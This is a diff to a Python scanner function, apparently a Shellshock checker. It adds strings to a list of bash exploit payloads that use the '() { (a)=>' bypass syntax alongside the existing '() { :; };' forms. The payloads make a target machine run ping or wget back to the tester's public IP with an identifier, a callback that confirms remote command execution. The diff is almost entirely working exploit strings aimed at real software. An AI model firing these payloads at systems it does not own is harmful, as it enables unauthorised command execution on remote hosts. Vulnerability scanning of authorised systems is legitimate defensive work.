@@ -63,7 +63,14 @@ def test_ip(ip_address, identifier):
 			   "() { :; }; ping -c 6 " + public_ip,
 			   "() { :; }; /usr/ping -c 6 " + public_ip,
 			   "() { :; }; /bin/bash -c 'ping -c 6 " + public_ip + "'",
-			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'" ]
+			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'",
+			   "'() { (a)=>\' wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "'() { (a)=>\' /usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null",
+			   "'() { (a)=>\' /bin/bash -c 'wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
+			   "'() { (a)=>\' ping -c 6 " + public_ip,
+			   "'() { (a)=>\' /usr/ping -c 6 " + public_ip,
+			   "'() { (a)=>\' /bin/bash -c 'ping -c 6 " + public_ip + "'",
+			   "'() { (a)=>\' /bin/bash -c '/usr/ping -c 6 " + public_ip + "'"]
 	
 	
 	for exploit_str in list_of_exp_str:
